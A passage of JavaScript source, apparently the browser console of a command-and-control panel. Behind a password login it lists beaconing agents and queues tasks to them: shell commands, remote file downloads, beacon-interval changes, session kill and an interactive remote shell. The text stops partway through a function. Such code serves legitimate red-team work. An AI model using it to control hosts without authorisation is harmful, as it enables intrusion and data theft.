'use strict';

let token = null;
let activeAgentID = null;
let activeAgent = null;
let seenTaskIDs = new Set();
let currentOutputs = [];
let pendingUploadFile = null;
let taskHistory = [];
let taskHistoryIndex = -1;
let interactiveHistory = [];
let interactiveHistoryIndex = -1;
let interactiveMode = false;
let interactiveReady = false;
let sseReader = null;
let agentsPollTimer = null;
let authExpiryTimer = null;
let allAgents = [];
let selectedTaskType = 'shell';
let taskRequestInFlight = false;
let killConfirmTimer = null;
let armedKillAgentID = null;
let hasHydratedOutputs = false;
let followOutput = true;

const MAX_LOGIN_BODY_BYTES = 4096;
const MAX_UPLOAD_BYTES = 36 * 1024;
const MAX_SLEEP_SECONDS = 24 * 60 * 60;
const MAX_REMOTE_PATH = 4096;
const POLL_INTERVAL_MS = 5000;
const KILL_CONFIRM_WINDOW_MS = 10000;
const OUTPUT_FOLLOW_THRESHOLD_PX = 40;

const TASK_TYPES = {
  shell: {
    buttonLabel: 'Queue Shell',
    help: 'Queue a single shell command for the selected session.',
    note: 'Shell payloads stay in memory only and are still server-side validated before queueing.',
    placeholder: 'Enter a shell command',
    requiresPayload: true,
    inputMode: 'text',
  },
  download: {
    buttonLabel: 'Queue Download',
    help: 'Request a remote file path and receive the result as a browser download.',
    note: 'Download paths are validated for control characters before the request is queued.',
    placeholder: 'Enter a remote file path',
    requiresPayload: true,
    inputMode: 'text',
  },
  sleep: {
    buttonLabel: 'Queue Sleep',
    help: 'Update the beacon interval in seconds.',
    note: 'Sleep values must be whole seconds between 1 and 86400.',
    placeholder: 'Enter seconds between 1 and 86400',
    requiresPayload: true,
    inputMode: 'numeric',
  },
  kill: {
    buttonLabel: 'Queue Kill',
    help: 'Terminate the selected session after it processes the task.',
    note: 'Kill requires a second confirmation click and does not accept an additional payload.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
  interactive: {
    buttonLabel: 'Start Interactive',
    help: 'Open a near-real-time shell view for the selected session.',
    note: 'Interactive mode temporarily increases beacon frequency while it is active.',
    placeholder: 'No additional value required',
    requiresPayload: false,
    inputMode: 'text',
  },
};

const $ = id => document.getElementById(id);
const taskTypeButtons = Array.from(document.querySelectorAll('[data-task-type]'));
const outputEmptyTitle = $('output-empty').querySelector('h3');
const outputEmptyText = $('output-empty').querySelector('p');

$('upload-path').maxLength = MAX_REMOTE_PATH;

async function apiFetch(path, opts = {}) {
  const headers = { ...(opts.headers || {}) };
  if (opts.body && !headers['Content-Type']) headers['Content-Type'] = 'application/json';
  if (token) headers.Authorization = 'Bearer ' + token;

  const resp = await fetch(path, { ...opts, headers });
  if (resp.status === 401 && token) {
    setLoggedOutState('Session expired. Sign in again.');
  }
  return resp;
}

$('password').addEventListener('input', () => {
  setLoginError('');
});

$('login-form').addEventListener('submit', async event => {
  event.preventDefault();

  const password = $('password').value;
  if (!password) {
    setLoginError('Enter the operator password.');
    $('password').focus();
    return;
  }

  const body = buildLoginBody(password);
  if (!body) {
    setLoginError('Password exceeds the maximum supported request size.');
    $('password').focus();
    return;
  }

  setLoginError('');
  setLoginPending(true);

  try {
    const resp = await apiFetch('/api/auth/login', {
      method: 'POST',
      body,
    });

    if (!resp.ok) {
      if (resp.status === 401) setLoginError('Wrong password');
      else if (resp.status === 429) setLoginError(loginThrottleMessage(resp));
      else setLoginError('Login failed (' + resp.status + ')');
      setLoginPending(false);
      return;
    }

    const data = await resp.json();
    setLoginPending(false);
    beginSession(data.token);
  } catch (_) {
    setLoginError('Network error. Check the browser console (F12).');
    setLoginPending(false);
  }
});

$('logout-btn').addEventListener('click', () => {
  setLoggedOutState('');
});

function beginSession(nextToken) {
  token = nextToken;
  selectedTaskType = 'shell';
  clearKillConfirmation();
  hasHydratedOutputs = false;
  followOutput = true;
  scheduleSessionExpiry(nextToken);
  $('password').value = '';
  setLoginError('');
  $('login-view').hidden = true;
  $('main-view').hidden = false;
  applyTaskTypeUI();
  startAgentPolling();
  updateOutputControls();
  window.setTimeout(() => {
    $('agent-filter').focus();
  }, 0);
}

function setLoggedOutState(message) {
  stopAgentPolling();
  clearSessionExpiry();
  stopSSEStream();
  exitInteractiveMode(false);

  token = null;
  activeAgentID = null;
  activeAgent = null;
  allAgents = [];
  seenTaskIDs = new Set();
  currentOutputs = [];
  pendingUploadFile = null;
  taskHistory = [];
  taskHistoryIndex = -1;
  interactiveHistory = [];
  interactiveHistoryIndex = -1;
  selectedTaskType = 'shell';
  clearKillConfirmation();
  setTaskStatus('', '');
  hasHydratedOutputs = false;
  followOutput = true;

  $('main-view').hidden = true;
  $('login-view').hidden = false;
  setLoginPending(false);
  $('password').value = '';
  setLoginError(message || '');
  $('agent-filter').value = '';
  $('agent-filter-empty').hidden = true;
  $('agent-list').textContent = '';
  $('output').textContent = '';
  $('input-area').hidden = true;
  $('clear-btn').hidden = true;
  $('clear-btn').disabled = false;
  $('console-meta').hidden = true;
  $('console-title').textContent = 'Select a session';
  $('session-count').textContent = '0 sessions';
  $('refresh-indicator').textContent = 'Signed out';
  $('count-online').textContent = '0';
  $('count-stale').textContent = '0';
  $('count-offline').textContent = '0';
  $('meta-state').className = 'meta-chip meta-state-chip';
  $('session-warning').hidden = true;
  $('session-warning').textContent = '';
  hideUploadPrompt();
  setQueueBusy(false, '');
  updateOutputControls();
  updateOutputEmptyState();
  $('password').focus();
}

function startAgentPolling() {
  stopAgentPolling();
  loadAgents();
  agentsPollTimer = window.setInterval(loadAgents, POLL_INTERVAL_MS);
}

function stopAgentPolling() {
  if (agentsPollTimer === null) return;
  window.clearInterval(agentsPollTimer);
  agentsPollTimer = null;
}

function scheduleSessionExpiry(jwtToken) {
  clearSessionExpiry();
  const claims = parseJWTClaims(jwtToken);
  if (!claims || typeof claims.exp !== 'number') return;

  const delay = claims.exp * 1000 - Date.now();
  if (delay <= 0) {
    setLoggedOutState('Session expired. Sign in again.');
    return;
  }

  authExpiryTimer = window.setTimeout(() => {
    setLoggedOutState('Session expired. Sign in again.');
  }, delay + 250);
}

function clearSessionExpiry() {
  if (authExpiryTimer === null) return;
  window.clearTimeout(authExpiryTimer);
  authExpiryTimer = null;
}

function parseJWTClaims(jwtToken) {
  const parts = jwtToken.split('.');
  if (parts.length !== 3) return null;

  let payload = parts[1].replace(/-/g, '+').replace(/_/g, '/');
  while (payload.length % 4 !== 0) payload += '=';

  try {
    return JSON.parse(atob(payload));
  } catch (_) {
    return null;
  }
}

function buildLoginBody(password) {
  const body = JSON.stringify({ password });
  return new TextEncoder().encode(body).length <= MAX_LOGIN_BODY_BYTES ? body : '';
}

function setLoginError(message) {
  const hasMessage = Boolean(message);
  $('login-error').textContent = message || '';
  $('password').classList.toggle('input-error', hasMessage);
}

function setLoginPending(isPending) {
  $('login-form').setAttribute('aria-busy', isPending ? 'true' : 'false');
  $('password').disabled = isPending;
  $('login-btn').disabled = isPending;
  $('login-btn').textContent = isPending ? 'Signing In...' : 'Sign In';
}

function loginThrottleMessage(resp) {
  const retryAfter = Number.parseInt(resp.headers.get('Retry-After') || '', 10);
  if (Number.isFinite(retryAfter) && retryAfter > 0) {
    return 'Too many attempts. Wait ' + retryAfter + 's and retry.';
  }
  return 'Too many attempts. Wait a minute and retry.';
}

function setTaskStatus(message, tone) {
  const status = $('task-status');
  status.hidden = !message;
  status.textContent = message || '';
  status.className = tone ? 'task-status ' + tone : 'task-status';
}

function isTypingTarget(target) {
  if (!target) return false;
  const tag = String(target.tagName || '').toUpperCase();
  return target.isContentEditable || tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
}

function isOutputNearBottom() {
  return outputEl.scrollHeight - outputEl.scrollTop - outputEl.clientHeight <= OUTPUT_FOLLOW_THRESHOLD_PX;
}

function updateOutputControls() {
  $('jump-latest-btn').hidden = followOutput || $('output').childElementCount === 0;
}

function scrollOutputToBottom() {
  outputEl.scrollTop = outputEl.scrollHeight;
  followOutput = true;
  updateOutputControls();
}

function focusPrimaryInput(selectContents, allowWhileBusy) {
  if (!activeAgentID || (taskRequestInFlight && !allowWhileBusy)) return;

  if (!$('upload-row').hidden) {
    $('upload-path').focus();
    if (selectContents) $('upload-path').select();
    return;
  }

  if (interactiveMode) {
    if (interactiveReady) {
      $('task-input').focus();
      if (selectContents) $('task-input').select();
    }
    return;
  }

  if (!TASK_TYPES[selectedTaskType].requiresPayload || $('task-input').disabled) return;
  $('task-input').focus();
  if (selectContents) $('task-input').select();
}

function shouldPersistCommandFocus() {
  return document.activeElement === $('task-input') || document.activeElement === $('send-btn');
}

function restoreCommandFocusIfNeeded(shouldRestore, selectContents) {
  if (!shouldRestore) return;
  window.requestAnimationFrame(() => {
    if (taskRequestInFlight || !activeAgentID) return;
    focusPrimaryInput(Boolean(selectContents));
  });
}

function clearKillConfirmation() {
  armedKillAgentID = null;
  if (killConfirmTimer !== null) {
    window.clearTimeout(killConfirmTimer);
    killConfirmTimer = null;
  }
}

function killConfirmationActive() {
  return Boolean(activeAgentID && armedKillAgentID === activeAgentID);
}

function armKillConfirmation() {
  clearKillConfirmation();
  armedKillAgentID = activeAgentID;
  killConfirmTimer = window.setTimeout(() => {
    clearKillConfirmation();
    if (!interactiveMode) {
      applyTaskTypeUI();
      updateTaskContextStatus();
    }
  }, KILL_CONFIRM_WINDOW_MS);
}

function updateTaskContextStatus() {
  if (taskRequestInFlight) return;
  if (selectedTaskType === 'kill' && killConfirmationActive()) {
    setTaskStatus('Confirmation armed. Click Confirm Kill within 10 seconds to queue session termination.', 'status-warn');
    return;
  }
  setTaskStatus('', '');
}

function setQueueBusy(isBusy, message) {
  taskRequestInFlight = isBusy;

  taskTypeButtons.forEach(button => {
    button.disabled = isBusy || interactiveMode;
  });

  $('send-btn').disabled = isBusy;
  $('upload-btn').disabled = isBusy || interactiveMode || !activeAgentID;
  $('upload-confirm-btn').disabled = isBusy;
  $('upload-cancel-btn').disabled = isBusy;
  $('clear-btn').disabled = isBusy;

  if (interactiveMode) {
    $('task-input').disabled = isBusy || !interactiveReady;
  } else if (!$('upload-row').hidden) {
    $('upload-path').disabled = isBusy;
  } else {
    $('task-input').disabled = isBusy || !TASK_TYPES[selectedTaskType].requiresPayload;
  }

  if (isBusy) setTaskStatus(message || 'Submitting task...', 'status-busy');
  else updateTaskContextStatus();

  renderAgentList();
}

async function readResponseMessage(resp, fallback) {
  try {
    const text = (await resp.text()).trim();
    if (text) {
      return text.length > 180 ? text.slice(0, 177) + '...' : text;
    }
  } catch (_) {
    // Ignore response body parsing failures and fall back to the default text.
  }
  return fallback;
}

$('agent-filter').addEventListener('input', renderAgentList);

async function loadAgents() {
  try {
    const resp = await apiFetch('/api/agents');
    if (!resp.ok) return;

    const agents = await resp.json();
    allAgents = Array.isArray(agents) ? agents.slice() : [];

    updateAgentStats(allAgents);
    updateRefreshMeta(allAgents.length);
    syncActiveAgent();
    renderAgentList();
  } catch (_) {
    $('refresh-indicator').textContent = 'Refresh failed';
  }

  await loadOutputs();
}

function getAgentAgeMs(agent) {
  if (!agent || !agent.last_seen) return Number.POSITIVE_INFINITY;
  const ts = new Date(agent.last_seen).getTime();
  if (!Number.isFinite(ts)) return Number.POSITIVE_INFINITY;
  return Math.max(0, Date.now() - ts);
}

function getAgentState(agent) {
  const ageMs = getAgentAgeMs(agent);
  if (ageMs <= 3 * 60 * 1000) return 'online';
  if (ageMs <= 10 * 60 * 1000) return 'stale';
  return 'offline';
}

function getAgentStateLabel(state) {
  if (state === 'online') return 'Online';
  if (state === 'stale') return 'Stale';
  return 'Offline';
}

function updateAgentStats(agents) {
  let online = 0;
  let stale = 0;
  let offline = 0;

  for (const agent of agents) {
    const state = getAgentState(agent);
    if (state === 'online') online++;
    else if (state === 'stale') stale++;
    else offline++;
  }

  $('count-online').textContent = String(online);
  $('count-stale').textContent = String(stale);
  $('count-offline').textContent = String(offline);
}

function updateRefreshMeta(agentCount) {
  const timeLabel = new Date().toLocaleTimeString();
  $('refresh-indicator').textContent = 'Updated ' + timeLabel;
  $('session-count').textContent = agentCount === 1 ? '1 session' : agentCount + ' sessions';
}

function syncActiveAgent() {
  if (!activeAgentID) {
    updateSessionHeader();
    return;
  }

  const match = allAgents.find(agent => agent.id === activeAgentID);
  if (!match) {
    clearActiveSession();
    return;
  }

  activeAgent = match;
  updateSessionHeader();
}

function clearActiveSession() {
  exitInteractiveMode(false);
  activeAgentID = null;
  activeAgent = null;
  currentOutputs = [];
  seenTaskIDs = new Set();
  clearKillConfirmation();
  hasHydratedOutputs = false;
  followOutput = true;
  $('output').textContent = '';
  $('input-area').hidden = true;
  $('clear-btn').hidden = true;
  $('console-meta').hidden = true;
  $('console-title').textContent = 'Select a session';
  $('session-warning').hidden = true;
  $('session-warning').textContent = '';
  hideUploadPrompt();
  updateTaskContextStatus();
  updateOutputControls();
  updateOutputEmptyState();
}

function renderAgentList() {
  const list = $('agent-list');
  list.textContent = '';

  const query = $('agent-filter').value.trim().toLowerCase();
  const filtered = allAgents.filter(agent => matchesAgentFilter(agent, query));

  if (!filtered.length) {
    const empty = $('agent-filter-empty');
    empty.hidden = false;
    empty.textContent = allAgents.length
      ? 'No sessions match the current filter.'
      : 'No sessions have registered yet.';
    return;
  }

  $('agent-filter-empty').hidden = true;

  for (const agent of filtered) {
    list.appendChild(buildAgentItem(agent));
  }
}

function matchesAgentFilter(agent, query) {
  if (!query) return true;
  const haystack = [
    agent.id || '',
    agent.hostname || '',
    agent.os || '',
    agent.arch || '',
  ].join(' ').toLowerCase();
  return haystack.includes(query);
}

function buildAgentItem(agent) {
  const state = getAgentState(agent);

  const li = document.createElement('li');
  li.className = 'agent-item';
  if (agent.id === activeAgentID) li.classList.add('active');

  const button = document.createElement('button');
  button.type = 'button';
  button.className = 'agent-card';
  button.title = agent.id;
  button.disabled = taskRequestInFlight;
  button.addEventListener('click', () => selectAgent(agent));

  const topRow = document.createElement('div');
  topRow.className = 'agent-row-top';

  const host = document.createElement('span');
  host.className = 'agent-host';
  host.textContent = agent.hostname || 'Unknown host';

  const stateLabel = document.createElement('span');
  stateLabel.className = 'agent-state state-' + state;
  stateLabel.textContent = getAgentStateLabel(state);

  topRow.appendChild(host);
  topRow.appendChild(stateLabel);

  const bottomRow = document.createElement('div');
  bottomRow.className = 'agent-row-bottom';

  const platform = document.createElement('span');
  platform.className = 'agent-platform';
  platform.textContent = formatAgentPlatform(agent);

  const seen = document.createElement('span');
  seen.className = 'agent-seen';
  seen.textContent = formatLastSeenCompact(agent);

  bottomRow.appendChild(platform);
  bottomRow.appendChild(seen);

  const idLabel = document.createElement('span');
  idLabel.className = 'agent-id';
  idLabel.textContent = 'ID ' + (agent.id || '').slice(0, 8);

  button.appendChild(topRow);
  button.appendChild(bottomRow);
  button.appendChild(idLabel);
  li.appendChild(button);

  return li;
}

function formatAgentPlatform(agent) {
  const os = agent.os || 'unknown';
  const arch = agent.arch || 'unknown';
  return os + ' / ' + arch;
}

function formatLastSeenCompact(agent) {
  const age = getAgentAgeMs(agent);
  if (!Number.isFinite(age)) return 'Never';
  return formatRelativeAge(age);
}

function formatLastSeenDetailed(agent) {
  if (!agent || !agent.last_seen) return 'Last seen never';
  const date = new Date(agent.last_seen);
  if (!Number.isFinite(date.getTime())) return 'Last seen unknown';
  return 'Last seen ' + date.toLocaleTimeString() + ' (' + formatRelativeAge(getAgentAgeMs(agent)) + ')';
}

function updateSessionWarning() {
  const warning = $('session-warning');
  if (!activeAgent) {
    warning.hidden = true;
    warning.textContent = '';
    warning.className = 'session-warning';
    return;
  }

  const state = getAgentState(activeAgent);
  if (state === 'online') {
    warning.hidden = true;
    warning.textContent = '';
    warning.className = 'session-warning';
    return;
  }

  warning.hidden = false;
  warning.className = 'session-warning state-' + state;
  if (state === 'stale') {
    warning.textContent = 'Session is stale. Verify recency before queueing follow-up tasks or starting interactive mode.';
    return;
  }

  warning.textContent = 'Session is offline. New tasks will remain queued until the host reconnects.';
}

function formatRelativeAge(ageMs) {
  if (!Number.isFinite(ageMs)) return 'never';
  if (ageMs < 15 * 1000) return 'just now';

  const seconds = Math.round(ageMs / 1000);
  if (seconds < 60) return seconds + 's ago';

  const minutes = Math.round(seconds / 60);
  if (minutes < 60) return minutes + 'm ago';

  const hours = Math.round(minutes / 60);
  if (hours < 24) return hours + 'h ago';

  const days = Math.round(hours / 24);
  return days + 'd ago';
}

function selectAgent(agent) {
  exitInteractiveMode(false);
  activeAgentID = agent.id;
  activeAgent = agent;
  seenTaskIDs = new Set();
  currentOutputs = [];
  clearKillConfirmation();
  hasHydratedOutputs = false;
  followOutput = true;
  $('output').textContent = '';
  hideUploadPrompt();
  renderAgentList();
  updateSessionHeader();
  updateTaskContextStatus();
  updateOutputControls();
  updateOutputEmptyState();
  loadOutputs();
  focusPrimaryInput(false);
}

function updateSessionHeader() {
  if (!activeAgent) {
    $('console-title').textContent = 'Select a session';
    $('console-meta').hidden = true;
    $('input-area').hidden = true;
    $('clear-btn').hidden = true;
    $('session-warning').hidden = true;
    updateOutputEmptyState();
    return;
  }

  const state = getAgentState(activeAgent);

  $('console-title').textContent = activeAgent.hostname || ('Session ' + activeAgent.id.slice(0, 8));
  $('meta-state').textContent = getAgentStateLabel(state);
  $('meta-state').className = 'meta-chip meta-state-chip state-' + state;
  $('meta-hostname').textContent = activeAgent.hostname || 'Unknown host';
  $('meta-platform').textContent = formatAgentPlatform(activeAgent);
  $('meta-lastseen').textContent = formatLastSeenDetailed(activeAgent);
  $('meta-id').textContent = 'ID ' + activeAgent.id.slice(0, 8);
  $('console-meta').hidden = false;
  $('input-area').hidden = false;
  $('clear-btn').hidden = false;
  updateSessionWarning();

  if (!interactiveMode) applyTaskTypeUI();
}

function updateOutputEmptyState() {
  const empty = $('output-empty');

  if (!activeAgentID) {
    outputEmptyTitle.textContent = 'No session selected';
    outputEmptyText.textContent = 'Choose a session to inspect activity and queue tasks. Output is rendered as plain text only.';
    empty.hidden = false;
    return;
  }

  if ($('output').childElementCount === 0) {
    outputEmptyTitle.textContent = 'No task output yet';
    outputEmptyText.textContent = 'This session has not returned task output during the current view.';
    empty.hidden = false;
    return;
  }

  empty.hidden = true;
}

async function loadOutputs() {
  if (!activeAgentID || !token) {
    updateOutputEmptyState();
    return;
  }

  try {
    const resp = await apiFetch('/api/agents/' + activeAgentID + '/tasks');
    if (!resp.ok) return;

    const hydrateOnly = !hasHydratedOutputs;
    const outputs = await resp.json();
    currentOutputs = Array.isArray(outputs) ? outputs : [];
    currentOutputs.forEach(output => handleTaskOutput(output, hydrateOnly));
    hasHydratedOutputs = true;
  } catch (_) {
    // Ignore transient polling failures and retain the current view.
  }

  updateOutputEmptyState();
}

function handleTaskOutput(output, historical) {
  if (!output || !output.task_id || seenTaskIDs.has(output.task_id)) return;

  seenTaskIDs.add(output.task_id);
  if (!currentOutputs.some(item => item.task_id === output.task_id)) currentOutputs.push(output);

  const ts = output.timestamp ? new Date(output.timestamp).toLocaleTimeString() : '';
  const short = output.task_id.slice(0, 8);

  if (output.type === 'interactive') {
    if (interactiveMode && !interactiveReady && output.output && output.output.includes('started')) {
      enableInteractiveInput();
    }
    return;
  }

  if (output.error) {
    appendOutput('[err ' + short + ' ' + ts + '] ' + output.error);
    return;
  }

  if (output.type === 'download' && output.output) {
    const payload = output.output.trim();
    if (!payload) {
      appendOutput('[err ' + short + ' ' + ts + '] invalid download payload');
      return;
    }

    appendDownloadResult(short, ts, payload, historical);
    return;
  }

  if (output.output && output.output.trim()) {
    if (interactiveMode && output.type === 'shell') {
      appendOutput(output.output.trimEnd(), 'interactive-out');
    } else {
      appendOutput('[' + short + ' ' + ts + ']\n' + output.output.trimEnd());
    }
  }
}

taskTypeButtons.forEach(button => {
  button.addEventListener('click', () => setTaskType(button.dataset.taskType));
});

function setTaskType(type) {
  if (!TASK_TYPES[type]) return;
  selectedTaskType = type;
  taskHistoryIndex = -1;
  if (type !== 'kill') clearKillConfirmation();
  clearTaskInputError();
  applyTaskTypeUI();
  focusPrimaryInput(true);
}

function applyTaskTypeUI() {
  const config = TASK_TYPES[selectedTaskType];

  taskTypeButtons.forEach(button => {
    const active = button.dataset.taskType === selectedTaskType;
    button.classList.toggle('active', active);
    button.setAttribute('aria-selected', active ? 'true' : 'false');
    button.disabled = taskRequestInFlight;
  });

  if (interactiveMode) {
    $('task-type-list').hidden = true;
    return;
  }

  $('task-type-list').hidden = false;
  $('task-help').classList.remove('error-copy');
  $('composer-note').classList.remove('error-note');
  $('task-help').textContent = config.help;
  $('composer-note').textContent = config.note;
  $('task-input').classList.remove('input-error');
  $('task-input').disabled = taskRequestInFlight || !config.requiresPayload;
  $('task-input').placeholder = config.placeholder;
  $('task-input').inputMode = config.inputMode;
  $('task-input').maxLength = selectedTaskType === 'download'
    ? MAX_REMOTE_PATH
    : selectedTaskType === 'sleep'
      ? String(MAX_SLEEP_SECONDS).length
      : 48000;
  $('send-btn').textContent = selectedTaskType === 'kill' && killConfirmationActive()
    ? 'Confirm Kill'
    : config.buttonLabel;
  $('send-btn').hidden = false;
  $('send-btn').disabled = taskRequestInFlight;
  $('send-btn').classList.toggle('warn-button', selectedTaskType === 'interactive');
  $('send-btn').classList.toggle('danger-button', selectedTaskType === 'kill');
  $('upload-btn').hidden = false;
  $('upload-btn').disabled = taskRequestInFlight || !activeAgentID;
  $('exit-interactive-btn').hidden = true;
  $('interactive-prompt').hidden = true;

  if (!config.requiresPayload) {
    $('task-input').value = '';
  }

  updateTaskContextStatus();
}

function setTaskInputError(message) {
  $('task-input').classList.add('input-error');
  $('task-help').classList.add('error-copy');
  $('task-help').textContent = message;
  $('task-input').focus();
}

function clearTaskInputError() {
  $('task-input').classList.remove('input-error');
  $('task-help').classList.remove('error-copy');
  if (!interactiveMode) $('task-help').textContent = TASK_TYPES[selectedTaskType].help;
}

$('task-input').addEventListener('input', clearTaskInputError);
$('upload-path').addEventListener('input', () => $('upload-path').classList.remove('input-error'));

$('send-btn').addEventListener('click', sendTask);

$('task-input').addEventListener('keydown', e => {
  if (e.key === 'Enter') {
    sendTask();
    return;
  }

  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (interactiveMode) navigateInteractiveHistory(-1);
    else navigateTaskHistory(-1);
    return;
  }

  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (interactiveMode) navigateInteractiveHistory(1);
    else navigateTaskHistory(1);
  }
});

document.addEventListener('keydown', e => {
  if (e.defaultPrevented) return;

  if (e.key === '/' && !$('main-view').hidden && !isTypingTarget(document.activeElement)) {
    e.preventDefault();
    $('agent-filter').focus();
    $('agent-filter').select();
    return;
  }

  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k' && !$('main-view').hidden) {
    e.preventDefault();
    focusPrimaryInput(true);
    return;
  }

  if (e.key !== 'Escape') return;

  if (!$('upload-row').hidden) {
    e.preventDefault();
    hideUploadPrompt();
    return;
  }

  if (killConfirmationActive()) {
    e.preventDefault();
    clearKillConfirmation();
    applyTaskTypeUI();
    updateTaskContextStatus();
  }
});

function navigateTaskHistory(direction) {
  if (!taskHistory.length) return;

  if (direction < 0) {
    taskHistoryIndex = taskHistoryIndex === -1 ? taskHistory.length - 1 : Math.max(0, taskHistoryIndex - 1);
  } else {
    if (taskHistoryIndex === -1) return;
    taskHistoryIndex++;
    if (taskHistoryIndex >= taskHistory.length) {
      taskHistoryIndex = -1;
      $('task-input').value = '';
      clearTaskInputError();
      return;
    }
  }

  const entry = taskHistory[taskHistoryIndex];
  setTaskType(entry.type);
  $('task-input').value = entry.payload;
}

function navigateInteractiveHistory(direction) {
  if (!interactiveHistory.length) return;

  if (direction < 0) {
    interactiveHistoryIndex = interactiveHistoryIndex === -1 ? interactiveHistory.length - 1 : Math.max(0, interactiveHistoryIndex - 1);
  } else {
    if (interactiveHistoryIndex === -1) return;
    interactiveHistoryIndex++;
    if (interactiveHistoryIndex >= interactiveHistory.length) {
      interactiveHistoryIndex = -1;
      $('task-input').value = '';
      return;
    }
  }

  $('task-input').value = interactiveHistory[interactiveHistoryIndex];
}

$('clear-btn').addEventListener('click', () => {
  $('output').textContent = '';
  seenTaskIDs = new Set(currentOutputs.map(output => output.task_id));
  followOutput = true;
  updateOutputControls();
  updateOutputEmptyState();
});

$('exit-interactive-btn').addEventListener('click', () => exitInteractiveMode(true));

async function sendTask() {
  if (!activeAgentID || taskRequestInFlight) return;

  if (interactiveMode) {
    await sendInteractiveCommand();
    return;
  }

  const task = buildTaskFromComposer();
  if (!task) return;

  if (task.type === 'interactive') {
    await queueInteractiveStart();
    return;
  }

  if (task.type === 'kill' && !killConfirmationActive()) {
    armKillConfirmation();
    applyTaskTypeUI();
    updateTaskContextStatus();
    return;
  }

  clearKillConfirmation();

  const targetAgentID = activeAgentID;
  const restoreFocus = shouldPersistCommandFocus() && TASK_TYPES[selectedTaskType].requiresPayload;
  setQueueBusy(true, 'Submitting ' + task.type + ' task...');

  try {
    const data = await submitTask(targetAgentID, task);
    if (!data) return;
    recordTaskHistory(task.type, task.payload);
    $('task-input').value = '';
    clearTaskInputError();
    appendOutput('[>] ' + task.type + formatTaskPayloadEcho(task) + '  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
  } catch (err) {
    appendOutput('[-] network error: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
    restoreCommandFocusIfNeeded(restoreFocus, false);
  }
}

async function submitTask(agentID, task) {
  const resp = await apiFetch('/api/agents/' + agentID + '/task', {
    method: 'POST',
    body: JSON.stringify(task),
  });

  if (!resp.ok) {
    const message = await readResponseMessage(resp, 'request failed (' + resp.status + ')');
    appendOutput('[-] ' + message, '', agentID);
    return null;
  }

  return resp.json();
}

async function queueInteractiveStart() {
  if (!activeAgentID || taskRequestInFlight) return;

  const targetAgentID = activeAgentID;
  setQueueBusy(true, 'Requesting interactive mode...');

  try {
    const data = await submitTask(targetAgentID, { type: 'interactive', payload: 'start' });
    if (!data) return;

    appendOutput('[>] interactive start  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
    enterInteractiveMode(targetAgentID);
  } catch (err) {
    appendOutput('[-] interactive start failed: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
  }
}

function buildTaskFromComposer() {
  const rawValue = $('task-input').value;

  switch (selectedTaskType) {
    case 'shell':
      if (!rawValue.trim()) {
        setTaskInputError('Enter a shell command before queueing the task.');
        return null;
      }
      return { type: 'shell', payload: rawValue };
    case 'download': {
      const path = rawValue.trim();
      if (!path) {
        setTaskInputError('Enter a remote file path before queueing the download.');
        return null;
      }
      if (hasInvalidPathChars(path)) {
        setTaskInputError('Download paths cannot contain line breaks or null bytes.');
        return null;
      }
      return { type: 'download', payload: path };
    }
    case 'sleep': {
      const value = rawValue.trim();
      const seconds = Number.parseInt(value, 10);
      if (!/^\d+$/.test(value) || !Number.isFinite(seconds) || seconds < 1 || seconds > MAX_SLEEP_SECONDS) {
        setTaskInputError('Sleep must be a whole number between 1 and 86400.');
        return null;
      }
      return { type: 'sleep', payload: value };
    }
    case 'kill':
      return { type: 'kill', payload: '' };
    case 'interactive':
      return { type: 'interactive', payload: 'start' };
    default:
      return null;
  }
}

function recordTaskHistory(type, payload) {
  taskHistory.push({ type, payload });
  if (taskHistory.length > 50) taskHistory.shift();
  taskHistoryIndex = -1;
}

function formatTaskPayloadEcho(task) {
  if (!task.payload) return '';
  if (task.type === 'shell') return ' ' + task.payload;
  return ' ' + task.payload;
}

async function sendInteractiveCommand() {
  if (taskRequestInFlight) return;

  const raw = $('task-input').value;
  if (!raw.trim() || !interactiveReady) return;

  const command = raw.trim();
  if (command === 'exit' || command === 'quit') {
    $('task-input').value = '';
    exitInteractiveMode(true);
    return;
  }

  const prompt = activeAgent && activeAgent.hostname ? activeAgent.hostname + ' $ ' : '$ ';
  const targetAgentID = activeAgentID;
  const restoreFocus = shouldPersistCommandFocus();
  setQueueBusy(true, 'Queueing interactive command...');

  try {
    const data = await submitTask(targetAgentID, { type: 'shell', payload: raw });
    if (!data) return;

    $('task-input').value = '';
    interactiveHistory.push(raw);
    if (interactiveHistory.length > 100) interactiveHistory.shift();
    interactiveHistoryIndex = -1;
    appendOutput(prompt + raw, 'interactive-cmd', targetAgentID);
  } catch (err) {
    appendOutput('[!] network error: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
    restoreCommandFocusIfNeeded(restoreFocus, false);
  }
}

function enterInteractiveMode(agentID) {
  interactiveMode = true;
  interactiveReady = false;
  $('output').classList.add('interactive-active');
  $('task-type-list').hidden = true;
  $('send-btn').hidden = true;
  $('upload-btn').hidden = true;
  $('exit-interactive-btn').hidden = false;

  const prompt = activeAgent && activeAgent.hostname ? activeAgent.hostname + ' $' : '$';
  $('interactive-prompt').textContent = prompt;
  $('interactive-prompt').hidden = false;

  $('task-help').classList.remove('error-copy');
  $('composer-note').classList.remove('error-note');
  $('task-help').textContent = 'Interactive shell is active. Type exit to return to queued task mode.';
  $('composer-note').textContent = 'Beacon frequency is temporarily elevated while interactive mode is active.';

  $('task-input').value = '';
  $('task-input').disabled = true;
  $('task-input').placeholder = 'Waiting for session...';

  const banner = document.createElement('div');
  banner.className = 'interactive-banner';
  banner.textContent = 'INTERACTIVE SHELL ' + (activeAgent && activeAgent.hostname ? activeAgent.hostname : agentID.slice(0, 8));
  $('output').appendChild(banner);
  scrollOutputToBottom();
  updateTaskContextStatus();
  startSSEStream(agentID);
}

function enableInteractiveInput() {
  interactiveReady = true;
  $('task-input').disabled = false;
  $('task-input').placeholder = 'Enter a command (exit to return)';
  $('task-input').focus();
}

function exitInteractiveMode(sendStop) {
  if (!interactiveMode) return;

  interactiveMode = false;
  interactiveReady = false;
  stopSSEStream();
  $('output').classList.remove('interactive-active');
  $('task-input').value = '';
  $('task-input').disabled = false;
